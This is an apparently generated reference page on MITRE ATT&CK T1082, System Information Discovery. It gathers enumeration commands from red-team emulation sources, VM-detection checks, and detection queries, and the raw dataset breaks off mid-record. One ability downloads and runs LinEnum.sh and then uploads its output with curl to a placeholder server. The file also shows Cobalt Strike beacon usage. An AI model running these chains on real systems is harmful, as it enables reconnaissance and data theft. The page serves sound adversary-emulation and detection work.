
# System Information Discovery

## Description

### MITRE Description

> An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

Example commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.

### Mac

On Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.

### AWS

In Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running.(Citation: Amazon System Discovery)

### GCP

On Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or <code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: Google Command Center Dashboard)

### Azure

In Azure, the API request <code>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines/{vmName}?api-version=2019-03-01</code> may be used to retrieve information about the model or instance view of a virtual machine.(Citation: Microsoft Virutal Machine API)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1082

## Potential Commands

```
ver
shell ver
set
shell set
get_env.rb
net config workstation
net config server
shell net config workstation
shell net config server
systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]
systemprofiler tool if no access yet (victim browses to website)
or
shell systeminfo (if you already have a beacon)
sysinfo, run winenum, get_env.rb
systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum

system_profiler
ls -al /Applications

uname -a >> /tmp/T1082.txt
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi;
if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi;      
if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi;
uptime >> /tmp/T1082.txt
cat /tmp/T1082.txt 2>/dev/null

if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi;
if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi;
if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi;
if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi;
if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi;
if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi;
if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"
if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"

sudo lsmod | grep -i "vboxsf\|vboxguest"
sudo lsmod | grep -i "vmw_baloon\|vmxnet"
sudo lsmod | grep -i "xen-vbd\|xen-vnif"
sudo lsmod | grep -i "virtio_pci\|virtio_net"
sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"

hostname

hostname

REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid

{'windows': {'psh,pwsh': {'command': '$PSVersionTable\n'}}}
{'darwin': {'sh': {'command': 'find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n'}}, 'linux': {'sh': {'command': 'find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n'}}}
{'linux': {'sh': {'command': "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n", 'cleanup': 'rm ./LinEnum.sh;\nrm /tmp/exfil.txt;\n'}}}
{'windows': {'psh': {'command': '[environment]::OSVersion.Version\n'}}}
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/winenum
powershell/situational_awareness/host/winenum
powershell/situational_awareness/network/powerview/get_computer
powershell/situational_awareness/network/powerview/get_computer
```

## Commands Dataset

```
[{'command': 'ver',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'shell ver',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'set',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'shell set',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'get_env.rb',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'net config workstation\nnet config server',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'shell net config workstation\nshell net config server',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'systeminfo [/s COMPNAME] [/u DOMAIN\\user] [/p password]',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'systemprofiler tool if no access yet (victim browses to '
             'website)\n'
             'or\n'
             'shell systeminfo (if you already have a beacon)',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'sysinfo, run winenum, get_env.rb',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'systeminfo\n'
             'reg query '
             'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'system_profiler\nls -al /Applications\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'uname -a >> /tmp/T1082.txt\n'
             'if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> '
             '/tmp/T1082.txt; fi;\n'
             'if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> '
             '/tmp/T1082.txt; fi;      \n'
             'if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; '
             'fi;\n'
             'uptime >> /tmp/T1082.txt\n'
             'cat /tmp/T1082.txt 2>/dev/null\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'if [ -f /sys/class/dmi/id/bios_version ]; then cat '
             '/sys/class/dmi/id/bios_version | grep -i amazon; fi;\n'
             'if [ -f /sys/class/dmi/id/product_name ]; then cat '
             '/sys/class/dmi/id/product_name | grep -i '
             '"Droplet\\|HVM\\|VirtualBox\\|VMware"; fi;\n'
             'if [ -f /sys/class/dmi/id/product_name ]; then cat '
             '/sys/class/dmi/id/chassis_vendor | grep -i "Xen\\|Bochs\\|QEMU"; '
             'fi;\n'
             'if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep '
             '-i "microsoft\\|vmware\\|virtualbox\\|quemu\\|domu"; fi;\n'
             'if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i '
             '"vmware\\|vbox"; fi;\n'
             'if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | '
             'grep -i "vmware\\|vbox\\|qemu\\|virtual"; fi;\n'
             'if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i '
             '"vmware\\|virtualbox"\n'
             'if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i '
             '"Xen\\|KVM\\|Microsoft"\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'sudo lsmod | grep -i "vboxsf\\|vboxguest"\n'
             'sudo lsmod | grep -i "vmw_baloon\\|vmxnet"\n'
             'sudo lsmod | grep -i "xen-vbd\\|xen-vnif"\n'
             'sudo lsmod | grep -i "virtio_pci\\|virtio_net"\n'
             'sudo lsmod | grep -i '
             '"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc"\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'hostname\n', 'name': None, 'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'hostname\n', 'name': None, 'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography '
             '/v MachineGuid\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': {'windows': {'psh,pwsh': {'command': '$PSVersionTable\n'}}},
  'name': 'Discover the PowerShell version',
  'source': 'data/abilities/discovery/29451844-9b76-4e16-a9ee-d6feab4b24db.yml'},
 {'command': {'darwin': {'sh': {'command': 'find / -type d -user '
                                           '#{host.user.name} \\( -perm -g+w '
                                           '-or -perm -o+w \\) 2>/dev/null '
                                           '-exec ls -adl {} \\;\n'}},
              'linux': {'sh': {'command': 'find / -type d -user '
                                          '#{host.user.name} \\( -perm -g+w '
                                          '-or -perm -o+w \\) 2>/dev/null '
                                          '-exec ls -adl {} \\;\n'}}},
  'name': 'Discover all directories containing deletable files by user',
  'source': 'data/abilities/discovery/30732a56-4a23-4307-9544-09caf2ed29d5.yml'},
 {'command': {'linux': {'sh': {'cleanup': 'rm ./LinEnum.sh;\n'
                                          'rm /tmp/exfil.txt;\n',
                               'command': 'wget '
                                          'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\n'
                                          'chmod +x LinEnum.sh;\n'
                                          './LinEnum.sh > /tmp/exfil.txt;\n'
                                          "curl -F 'data=@/tmp/exfil.txt' "
                                          '#{server}/file/upload ;\n'
                                          'cat /tmp/exfil.txt;\n'}}},
  'name': 'Download and execute LinEnum.sh',
  'source': 'data/abilities/discovery/46098c66-8d9a-4d23-8a95-dd5021c385ae.yml'},
 {'command': {'windows': {'psh': {'command': '[environment]::OSVersion.Version\n'}}},
  'name': 'Find OS Version',
  'source': 'data/abilities/discovery/b6b105b9-41dc-490b-bc5c-80d699b82ce8.yml'},
 {'command': 'powershell/situational_awareness/host/computerdetails',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/host/computerdetails',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/host/winenum',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/host/winenum',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/powerview/get_computer',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/powerview/get_computer',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'System Information Discovery',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_path '
           'contains"sysinfo.exe"or process_path contains "reg.exe")and '
           'process_command_line contains "reg*query '
           'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum"'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: Information found in the windows system\n'
           'description: windows server 2012 test results\n'
           'references: '
           'https://github.com/0xpwntester/CB-Threat-Hunting/blob/master/ATT%26CK/T1082-%20systeminfo%20executions.md\n'
           'tags: T1082\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4688 # have created a new '
           'process.\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Newprocessname: 'C: \\ Windows \\ "
           "System32 \\ systeminfo.exe' # new process name\n"
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Tokenpromotiontype: '
           "'TokenElevationTypeDefault (1)' # token type lifting\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Processcommandline: 'systeminfo' # "
           'command-line process\n'
           '\xa0\xa0\xa0\xa0condition: selection\n'
           'level: medium'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'ver',
                                                  'Category': 'T1082',
                                                  'Cobalt Strike': 'shell ver',
                                                  'Description': 'Get the '
                                                                 'Windows OS '
                                                                 'version '
                                                                 "that's "
                                                                 'running',
                                                  'Metasploit': ''}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'set',
                                                  'Category': 'T1082',
                                                  'Cobalt Strike': 'shell set',
                                                  'Description': 'Print all of '
                                                                 'the '
                                                                 'environment '
                                                                 'variables',
                                                  'Metasploit': 'get_env.rb'}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'net '
                                                                              'config '
                                                                              'workstation\n'
                                                                              'net '
                                                                              'config '
                                                                              'server',
                                                  'Category': 'T1082',
                                                  'Cobalt Strike': 'shell net '
                                                                   'config '
                                                                   'workstation\n'
                                                                   'shell net '
                                                                   'config '
                                                                   'server',
                                                  'Description': 'Get computer '
                                                                 'name, '
                                                                 'username, OS '
                                                                 'software '
                                                                 'version, '
                                                                 'domain '
                                                                 'information, '
                                                                 'DNS, logon '
                                                                 'domain',
                                                  'Metasploit': ''}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'systeminfo '
                                                                              '[/s '
                                                                              'COMPNAME] '
                                                                              '[/u '
                                                                              'DOMAIN\\user] '
                                                                              '[/p '
                                                                              'password]',
                                                  'Category': 'T1082',
                                                  'Cobalt Strike': 'systemprofiler '
                                                                   'tool if no '
                                                                   'access yet '
                                                                   '(victim '
                                                                   'browses to '
                                                                   'website)\n'
                                                                   'or\n'
                                                                   'shell '
                                                                   'systeminfo '
                                                                   '(if you '
                                                                   'already '
                                                                   'have a '
                                                                   'beacon)',
                                                  'Description': 'Displays '
                                                                 'detailed '
                                                                 'configuration '
                                                                 'information '
                                                                 'about a '
                                                                 'computer and '
                                                                 'its '
                                                                 'operating '
                                                                 'system, '
                                                                 'including '
                                                                 'operating '
                                                                 'system '
                                                                 'configuration, '
                                                                 'security '
                                                                 'information, '
                                                                 'product ID, '
                                                                 'and hardware '
                                                                 'properties, '
                                                                 'such as RAM, '
                                                                 'disk space, '
                                                                 'and network '
                                                                 'cards',
                                                  'Metasploit': 'sysinfo, run '
                                                                'winenum, '
                                                                'get_env.rb'}},
 {'Atomic Red Team Test - System Information Discovery': {'atomic_tests': [{'description': 'Identify '
                                                                                           'System '
                                                                                           'Info. '
                                                                                           'Upon '
                                                                                           'execution, '
                                                                                           'system '
                                                                                           'info '
                                                                                           'and '
                                                                                           'time '
                                                                                           'info '
                                                                                           'will '
                                                                                           'be '
                                                                                           'displayed.\n',
                                                                            'executor': {'command': 'systeminfo\n'
                                                                                                    'reg '
                                                                                                    'query '
                                                                                                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n',
                                                                                         'elevation_required': False,
                                                                                         'name': 'command_prompt'},
                                                                            'name': 'System '
                                                                                    'Information '
                                                                                    'Discovery',
                                                                            'supported_platforms': ['windows']},
                                                                           {'description': 'Identify '
                                                                                           'System '
                                                                                           'Info\n',
                                                                            'executor': {'command': 'system_profiler\n'
                                                                                                    'ls '
                                                                                                    '-al '
                                                                                                    '/Applications\n',
                                                                                         'name': 'sh'},
                                                                            'name': 'System '
                                                                                    'Information '
                                                                                    'Discovery',
                                                                            'supported_platforms': ['macos']},
                                                                           {'description': 'Identify '
                                                                                           'System '
                                                                                           'Info\n',
                                                                            'executor': {'cleanup_command': 'rm '
                                                                                                            '#{output_file} '
                                                                                                            '2>/dev/null\n',
                                                                                         'command': 'uname '
                                                                                                    '-a '
                                                                                                    '>> '
                                                                                                    '#{output_file}\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/etc/lsb-release '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/etc/lsb-release '
                                                                                                    '>> '
                                                                                                    '#{output_file}; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/etc/redhat-release '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/etc/redhat-release '
                                                                                                    '>> '
                                                                                                    '#{output_file}; '
                                                                                                    'fi;      \n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/etc/issue '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/etc/issue '
                                                                                                    '>> '
                                                                                                    '#{output_file}; '
                                                                                                    'fi;\n'
                                                                                                    'uptime '
                                                                                                    '>> '
                                                                                                    '#{output_file}\n'
                                                                                                    'cat '
                                                                                                    '#{output_file} '
                                                                                                    '2>/dev/null\n',
                                                                                         'name': 'sh'},
                                                                            'input_arguments': {'output_file': {'default': '/tmp/T1082.txt',
                                                                                                                'description': 'Output '
                                                                                                                               'file '
                                                                                                                               'used '
                                                                                                                               'to '
                                                                                                                               'store '
                                                                                                                               'the '
                                                                                                                               'results.',
                                                                                                                'type': 'path'}},
                                                                            'name': 'List '
                                                                                    'OS '
                                                                                    'Information',
                                                                            'supported_platforms': ['linux',
                                                                                                    'macos']},
                                                                           {'description': 'Identify '
                                                                                           'virtual '
                                                                                           'machine '
                                                                                           'hardware. '
                                                                                           'This '
                                                                                           'technique '
                                                                                           'is '
                                                                                           'used '
                                                                                           'by '
                                                                                           'the '
                                                                                           'Pupy '
                                                                                           'RAT '
                                                                                           'and '
                                                                                           'other '
                                                                                           'malware.\n',
                                                                            'executor': {'command': 'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/sys/class/dmi/id/bios_version '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/sys/class/dmi/id/bios_version '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    'amazon; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/sys/class/dmi/id/product_name '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/sys/class/dmi/id/product_name '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"Droplet\\|HVM\\|VirtualBox\\|VMware"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/sys/class/dmi/id/product_name '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/sys/class/dmi/id/chassis_vendor '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"Xen\\|Bochs\\|QEMU"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-x '
                                                                                                    '"$(command '
                                                                                                    '-v '
                                                                                                    'dmidecode)" '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'sudo '
                                                                                                    'dmidecode '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/proc/scsi/scsi '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/proc/scsi/scsi '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vmware\\|vbox"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/proc/ide/hd0/model '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/proc/ide/hd0/model '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vmware\\|vbox\\|qemu\\|virtual"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-x '
                                                                                                    '"$(command '
                                                                                                    '-v '
                                                                                                    'lspci)" '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'sudo '
                                                                                                    'lspci '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vmware\\|virtualbox"\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-x '
                                                                                                    '"$(command '
                                                                                                    '-v '
                                                                                                    'lscpu)" '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'sudo '
                                                                                                    'lscpu '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"Xen\\|KVM\\|Microsoft"\n',
                                                                                         'name': 'bash'},
                                                                            'name': 'Linux '
                                                                                    'VM '
                                                                                    'Check '
                                                                                    'via '
                                                                                    'Hardware',
                                                                            'supported_platforms': ['linux']},
                                                                           {'description': 'Identify '
                                                                                           'virtual '
                                                                                           'machine '
                                                                                           'guest '
                                                                                           'kernel '
                                                                                           'modules. '
                                                                                           'This '
                                                                                           'technique '
                                                                                           'is '
                                                                                           'used '
                                                                                           'by '
                                                                                           'the '
                                                                                           'Pupy '
                                                                                           'RAT '
                                                                                           'and '
                                                                                           'other '
                                                                                           'malware.\n',
                                                                            'executor': {'command': 'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vboxsf\\|vboxguest"\n'
                                                                                                    'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vmw_baloon\\|vmxnet"\n'
                                                                                                    'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"xen-vbd\\|xen-vnif"\n'
                                                                                                    'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"virtio_pci\\|virtio_net"\n'
                                                                                                    'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc"\n',
                                                                                         'name': 'bash'},
                                                                            'name': 'Linux '
                                                                                    'VM '
                                                                                    'Check '
                                                                                    'via '
                                                                                    'Kernel '
                                                                                    'Modules',
                                                                            'supported_platforms': ['linux']},
                                                                           {'description': 'Identify '
                                                                                           'system '
                                                                                           'hostname '
                                                                                           'for '
                                                                                           'Windows. '
                                                                                           'Upon '
                                                                                           'execution, '
                                                                                           'the '
                                                                                           'hostname '
                                                                                           'of '
                                                                                           'the '
                                                                                           'device '
                                                                                           'will '
                                                                                           'be '
                                                                                           'displayed.\n',
                                                                            'executor': {'command': 'hostname\n',
                                                                                         'elevation_required': False,
                                                                                         'name': 'command_prompt'},
                                                                            'name': 'Hostname '
                                                                                    'Discovery '
                                                                                    '(Windows)',
                                                                            'supported_platforms': ['windows']},
                                                                           {'description': 'Identify '
                                                                                           'system '
                                                                                           'hostname '
                                                                                           'for '
                                                                                           'Linux '
                                                                                           'and '
                                                                                           'macOS '
                                                                                           'systems.\n',
                                                                            'executor': {'command': 'hostname\n',
                                                                                         'elevation_required': False,
                                                                                         'name': 'bash'},
                                                                            'name': 'Hostname '
                                                                                    'Discovery',
                                                                            'supported_platforms': ['linux',
                                                                                                    'macos']},
                                                                           {'description': 'Identify '
                                                                                           'the '
                                                                                           'Windows '
                                                                                           'MachineGUID '
                                                                                           'value '
                                                                                           'for '
                                                                                           'a '
                                                                                           'system. '
                                                                                           'Upon '
                                                                                           'execution, '
                                                                                           'the '
                                                                                           'machine '
                                                                                           'GUID '
                                                                                           'will '
                                                                                           'be '
                                                                                           'displayed '
                                                                                           'from '
                                                                                           'registry.\n',
                                                                            'executor': {'command': 'REG '
                                                                                                    'QUERY '
                                                                                                    'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography '
                                                                                                    '/v '
                                                                                                    'MachineGuid\n',
                                                                                         'elevation_required': False,
                                                                                         'name': 'command_prompt'},
                                                                            'name': 'Windows '
                                                                                    'MachineGUID '
                                                                                    'Discovery',
                                                                            'supported_platforms': ['windows']}],
                                                          'attack_technique': 'T1082',
                                                          'display_name': 'System '
                                                                          'Information '
                                                                          'Discovery'}},
 {'Mitre Stockpile - Discover the PowerShell version': {'description': 'Discover '
                                                                       'the '
                                                                       'PowerShell '
                                                                       'version',
                                                        'id': '29451844-9b76-4e16-a9ee-d6feab4b24db',
                                                        'name': 'PowerShell '
                                                                'version',
                                                        'platforms': {'windows': {'psh,pwsh': {'command': '$PSVersionTable\n'}}},
                                                        'tactic': 'discovery',
                                                        'technique': {'attack_id': 'T1082',
                                                                      'name': 'System '
                                                                              'Information '
                                                                              'Discovery'}}},
 {'Mitre Stockpile - Discover all directories containing deletable files by user': {'description': 'Discover '
                                                                                                   'all '
                                                                                                   'directories '
                                                                                                   'containing '
                                                                                                   'deletable '
                                                                                                   'files '
                                                                                                   'by '
                                                                                                   'user',
                                                                                    'id': '30732a56-4a23-4307-9544-09caf2ed29d5',
                                                                                    'name': 'Find '
                                                                                            'deletable '
                                                                                            'dirs '
                                                                                            '(per '
                                                                                            'user)',
                                                                                    'platforms': {'darwin': {'sh': {'command': 'find '
                                                                                                                               '/ '
                                                                                                                               '-type '
                                                                                                                               'd '
                                                                                                                               '-user '
                                                                                                                               '#{host.user.name} '
                                                                                                                               '\\( '
                                                                                                                               '-perm '
                                                                                                                               '-g+w '
                                                                                                                               '-or '
                                                                                                                               '-perm '
                                                                                                                               '-o+w '
                                                                                                                               '\\) '
                                                                                                                               '2>/dev/null '
                                                                                                                               '-exec '
                                                                                                                               'ls '
                                                                                                                               '-adl '
                                                                                                                               '{} '
                                                                                                                               '\\;\n'}},
                                                                                                  'linux': {'sh': {'command': 'find '
                                                                                                                              '/ '
                                                                                                                              '-type '
                                                                                                                              'd '
                                                                                                                              '-user '
                                                                                                                              '#{host.user.name} '
                                                                                                                              '\\( '
                                                                                                                              '-perm '
                                                                                                                              '-g+w '
                                                                                                                              '-or '
                                                                                                                              '-perm '
                                                                                                                              '-o+w '
                                                                                                                              '\\) '
                                                                                                                              '2>/dev/null '
                                                                                                                              '-exec '
                                                                                                                              'ls '
                                                                                                                              '-adl '
                                                                                                                              '{} '
                                                                                                                              '\\;\n'}}},
                                                                                    'requirements': [{'plugins.stockpile.app.requirements.paw_provenance': [{'source': 'host.user.name'}]}],
                                                                                    'tactic': 'discovery',
                                                                                    'technique': {'attack_id': 'T1082',
                                                                                                  'name': 'System '
                                                                                                          'Information '
                                                                                                          'Discovery'}}},
 {'Mitre Stockpile - Download and execute LinEnum.sh': {'description': 'Download '
                                                                       'and '
                                                                       'execute '
                                                                       'LinEnum.sh',
                                                        'id': '46098c66-8d9a-4d23-8a95-dd5021c385ae',
                                                        'name': 'Linux '
                                                                'Enumeration & '
                                                                'Privilege '
                                                                'Escalation '
                                                                'Discovery '
                                                                'Script',
                                                        'platforms': {'linux': {'sh': {'cleanup': 'rm '
                                                                                                  './LinEnum.sh;\n'
                                                                                                  'rm '
                                                                                                  '/tmp/exfil.txt;\n',
                                                                                       'command': 'wget '
                                                                                                  'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\n'
                                                                                                  'chmod '
                                                                                                  '+x '
                                                                                                  'LinEnum.sh;\n'
                                                                                                  './LinEnum.sh '
                                                                                                  '> '
                                                                                                  '/tmp/exfil.txt;\n'
                                                                                                  'curl '
                                                                                                  '-F '
                                                                                                  "'data=@/tmp/exfil.txt' "
                                                                                                  '#{server}/file/upload '
                                                                                                  ';\n'
                                                                                                  'cat '
                                                                                                  '/tmp/exfil.txt;\n'}}},
                                                        'tactic': 'discovery',
